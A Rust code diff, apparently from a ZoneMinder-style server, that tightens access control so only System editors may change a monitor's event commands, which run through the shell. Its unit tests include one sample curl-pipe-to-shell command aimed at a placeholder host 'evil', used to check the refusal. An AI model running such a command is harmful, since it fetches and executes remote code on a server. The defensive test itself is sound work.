@@ -34,7 +34,7 @@ fn ensure_visible(scope: &MonitorScope, id: u32, required: Level) -> AppResult<(
 }
 
 pub async fn list_all(state: &AppState, scope: &MonitorScope) -> AppResult<Vec<MonitorResponse>> {
-    info!("Listing all monitors.");
+    tracing::debug!("Listing all monitors.");
     let filter = scope.visible_ids(Level::View);
     let monitors = repo::monitors::find_all(state.db(), filter.as_deref()).await?;
     Ok(monitors.into_iter().map(MonitorResponse::from).collect())
@@ -46,7 +46,7 @@ pub async fn list_paginated(
     include_deleted: bool,
     scope: &MonitorScope,
 ) -> AppResult<PaginatedResponse<MonitorResponse>> {
-    info!("Listing monitors with pagination.");
+    tracing::debug!("Listing monitors with pagination.");
     let filter = scope.visible_ids(Level::View);
     let (items, total) =
         repo::monitors::find_paginated(state.db(), params, filter.as_deref(), include_deleted)
@@ -60,7 +60,7 @@ pub async fn get_by_id(
     id: u32,
     scope: &MonitorScope,
 ) -> AppResult<MonitorResponse> {
-    info!("Getting monitor by ID: {id}.");
+    tracing::debug!("Getting monitor by ID: {id}.");
     ensure_visible(scope, id, Level::View)?;
     let monitor = repo::monitors::find_by_id(state.db(), id)
         .await?
@@ -257,11 +257,36 @@ pub async fn create(state: &AppState, req: CreateMonitorRequest) -> AppResult<Mo
     Ok(MonitorResponse::from(result))
 }
 
+/// `EventStartCommand`/`EventEndCommand` are run by `zmc` (through `/bin/sh -c`
+/// when they hold a `%` tag), so changing one is shell access on the server.
+/// ZoneMinder keeps that to System editors. Sending the
+/// current value again is not a change.
+pub fn ensure_may_set_event_commands(
+    perms: &crate::util::authz::UserPermissions,
+    requested: [Option<&str>; 2],
+    current: [&str; 2],
+) -> AppResult<()> {
+    if perms.system >= Level::Edit {
+        return Ok(());
+    }
+    let changed = requested
+        .iter()
+        .zip(current)
+        .any(|(req, cur)| req.is_some_and(|r| r != cur));
+    if changed {
+        return Err(AppError::PermissionDeniedError(
+            "changing a monitor's event commands needs System Edit".to_string(),
+        ));
+    }
+    Ok(())
+}
+
 pub async fn update(
     state: &AppState,
     id: u32,
     req: UpdateMonitorRequest,
     scope: &MonitorScope,
+    perms: &crate::util::authz::UserPermissions,
 ) -> AppResult<MonitorResponse> {
     // Id only: the request carries camera RTSP/ONVIF credentials.
     info!("Updating monitor with ID: {id}.");
@@ -276,6 +301,17 @@ pub async fn update(
                 resource_type: ResourceType::File,
             })
         })?;
+    ensure_may_set_event_commands(
+        perms,
+        [
+            req.event_start_command.as_deref(),
+            req.event_end_command.as_deref(),
+        ],
+        [
+            &monitor_model.event_start_command,
+            &monitor_model.event_end_command,
+        ],
+    )?;
 
     // The row as it was, to stop its daemons with after the save.
     let before = monitor_model.clone();
@@ -939,4 +975,54 @@ pub async fn control_alarm(
 
     // Return the current monitor state from DB
     Ok(MonitorResponse::from(monitor_model))
+}
+
+#[cfg(test)]
+mod event_command_tests {
+    use super::*;
+    use crate::util::authz::UserPermissions;
+
+    fn monitors_editor() -> UserPermissions {
+        UserPermissions {
+            monitors: Level::Edit,
+            system: Level::View,
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn a_monitors_editor_cannot_set_an_event_command() {
+        let err = ensure_may_set_event_commands(
+            &monitors_editor(),
+            [Some("/bin/sh -c 'curl evil | sh' %EID%"), None],
+            ["", ""],
+        )
+        .expect_err("must be refused");
+        assert!(matches!(err, AppError::PermissionDeniedError(_)));
+        assert!(ensure_may_set_event_commands(
+            &monitors_editor(),
+            [None, Some("")],
+            ["", "/usr/local/bin/notify"],
+        )
+        .is_err());
+    }
+
+    #[test]
+    fn resending_the_current_commands_is_not_a_change() {
+        assert!(ensure_may_set_event_commands(
+            &monitors_editor(),
+            [Some("/usr/local/bin/notify"), None],
+            ["/usr/local/bin/notify", ""],
+        )
+        .is_ok());
+    }
+
+    #[test]
+    fn a_system_editor_may_set_event_commands() {
+        let admin = UserPermissions {
+            system: Level::Edit,
+            ..Default::default()
+        };
+        assert!(ensure_may_set_event_commands(&admin, [Some("x"), Some("y")], ["", ""]).is_ok());
+    }
 }
